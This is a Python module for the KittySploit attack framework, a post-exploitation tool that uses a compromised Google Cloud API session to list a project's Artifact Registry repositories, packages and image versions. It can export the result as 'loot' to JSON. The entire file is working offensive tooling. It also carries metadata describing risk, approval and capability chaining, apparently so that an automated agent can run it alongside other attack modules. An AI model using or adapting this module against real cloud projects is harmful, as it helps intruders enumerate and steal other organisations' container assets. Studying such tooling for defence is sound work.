#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Artifact Registry Images Loot",
        "description": "List Artifact Registry repositories, packages, and image versions",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "artifact-registry", "containers", "loot"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['api_request'],
        'expected_requests': 15,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    max_repos = OptInteger(10, "Maximum repositories to process", False)
    max_packages = OptInteger(20, "Maximum packages per repository", False)
    max_versions = OptInteger(10, "Maximum versions per package", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            repos = self._list_repositories()
            if not repos:
                print_warning("No Artifact Registry repositories found")
                return self.module_result(success=True, data={"repositories": []})

            max_repos = max(1, int(self.max_repos or 10))
            max_packages = max(1, int(self.max_packages or 20))
            max_versions = max(1, int(self.max_versions or 10))
            loot = []

            print_info(f"Looting images from {min(len(repos), max_repos)} repository(ies)...")
            for repo in repos[:max_repos]:
                repo_name = str(repo.get("name") or "")
                short_name = repo_name.rsplit("/", 1)[-1]
                format_type = repo.get("format")
                print_info(f"Repository: {short_name} format={format_type}")

                packages = self._list_packages(repo_name, max_packages)
                repo_entry = {
                    "name": short_name,
                    "full_name": repo_name,
                    "format": format_type,
                    "location": repo.get("location"),
                    "packages": [],
                }

                for package in packages:
                    package_name = str(package.get("name") or "")
                    package_short = package_name.rsplit("/", 1)[-1]
                    versions = self._list_versions(package_name, max_versions)
                    package_entry = {
                        "name": package_short,
                        "full_name": package_name,
                        "versions": versions,
                    }
                    repo_entry["packages"].append(package_entry)
                    print_success(f"  package: {package_short} ({len(versions)} version(s))")
                    for version in versions[:3]:
                        tags = version.get("tags") or []
                        tag_text = f" tags={tags}" if tags else ""
                        print_info(f"    - {version.get('name', '').rsplit('/', 1)[-1]}{tag_text}")

                loot.append(repo_entry)
                print_info("-" * 80)

            payload = {"project_id": project_id, "repositories": loot}
            exported = self._gcp_export_json(self.export_json, payload) if self.export_json else ""
            if exported:
                print_success(f"Loot exported to {exported}")
            print_success(f"Processed {len(loot)} repository(ies)")
            return self.module_result(success=True, data=payload)
        except Exception as exc:
            print_error(f"Artifact Registry loot failed: {exc}")
            return False

    def _list_repositories(self):
        body = self._gcp_body_dict("artifact_repos")
        return list(body.get("repositories") or [])

    def _list_packages(self, repository_name, max_packages):
        url = f"https://artifactregistry.googleapis.com/v1/{repository_name}/packages"
        return self._gcp_paginate_get(
            url,
            "packages",
            max_items=max_packages,
            params={"pageSize": min(max_packages, 100)},
        )

    def _list_versions(self, package_name, max_versions):
        url = f"https://artifactregistry.googleapis.com/v1/{package_name}/versions"
        return self._gcp_paginate_get(
            url,
            "versions",
            max_items=max_versions,
            params={"pageSize": min(max_versions, 100)},
        )
